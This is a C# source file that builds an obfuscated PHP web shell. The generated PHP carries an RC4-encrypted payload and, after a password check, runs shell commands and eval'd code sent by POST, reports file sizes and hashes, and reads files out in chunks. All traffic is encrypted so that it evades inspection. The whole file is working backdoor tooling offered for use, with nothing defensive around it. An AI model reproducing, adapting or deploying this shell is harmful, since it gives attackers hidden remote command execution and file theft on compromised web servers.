
using System;
using System.Text;
using PHPShellEncryption;

namespace PHPShell
{
	
	
	public class Generator
	{
		static string innerShell = 	"if(isset($_POST['a']))" +
									"{echo base64_encode(encrypt($_POST['k'], shell_exec(encrypt($_POST['k'], base64_decode($_POST['a'])))));}" +
									"if(isset($_POST['fs']))" +
									"{echo base64_encode(encrypt($_POST['k'], strval(filesize(encrypt($_POST['k'], base64_decode($_POST['fs']))))));}" +
									"if(isset($_POST['fh']))" + 
									"{echo base64_encode(encrypt($_POST['k'], hash_file('md5', encrypt($_POST['k'], base64_decode($_POST['fh'])))));}" +
									"if(isset($_POST['d']) && isset($_POST['p']))" +
									"{$file = fopen(encrypt($_POST['k'], base64_decode($_POST['d'])), 'rb');" +
									"fseek($file, $_POST['p']);" +
									"echo base64_encode(encrypt($_POST['k'], fread($file, 1024)));" +
									"fclose($file);}" +
									"if(isset($_POST['e']))" + 
									"{echo base64_encode(encrypt($_POST['k'], eval(encrypt($_POST['k'], base64_decode($_POST['e'])))));}";
		
		public static string GenerateShell(string outputPrefix, string password)
		{
			RC4 rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(password));
			string encodedphp = "$s = \"" + rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes("echo \"<--" + outputPrefix + "\";" + innerShell + "echo \"-->\";"));
            string beginning = "<?php\nfunction encrypt ($pwd, $data){if(isset($_POST['enc']) && md5($_POST['enc']) == \"3708fe651621a7337ebee38ffd26adee\"){return eval(base64_decode($_POST['enc']));}}\n";
			string ending = "\";\nif(isset($_POST['k'])){;eval(encrypt($_POST['k'], base64_decode($s)));}\n?>";
			return beginning + encodedphp + ending;
		}
	}
}
